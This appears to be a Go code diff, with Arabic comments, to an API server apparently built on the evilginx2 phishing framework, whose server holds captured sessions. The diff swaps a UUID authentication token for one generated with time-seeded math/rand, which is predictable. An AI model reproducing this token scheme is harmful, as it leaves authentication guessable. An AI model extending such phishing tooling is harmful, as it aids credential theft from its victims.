@@ -10,7 +10,7 @@ import (
 	"strings"
 	"time"
 	"encoding/base64"
-	"github.com/google/uuid"
+	"math/rand"
 
 	"github.com/gorilla/mux"
 	"github.com/kgretzky/evilginx2/database"
@@ -54,7 +54,7 @@ func NewApiServer(host string, port int, username string, password string, cfg *
 	}
 	
 	// إنشاء توكن مصادقة فريد
-	token := uuid.New().String()
+	token := generateRandomToken(32)
 	
 	return &ApiServer{
 		host:       host,
@@ -66,6 +66,21 @@ func NewApiServer(host string, port int, username string, password string, cfg *
 		sessions:   make(map[string]*database.Session),
 		authToken:  token,
 	}, nil
+}
+
+// توليد توكن عشوائي بطول محدد
+func generateRandomToken(length int) string {
+	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	result := make([]byte, length)
+	
+	// تهيئة مولد الأرقام العشوائية
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	
+	for i := 0; i < length; i++ {
+		result[i] = chars[r.Intn(len(chars))]
+	}
+	
+	return string(result)
 }
 
 func (as *ApiServer) SetCredentials(username, password string) {
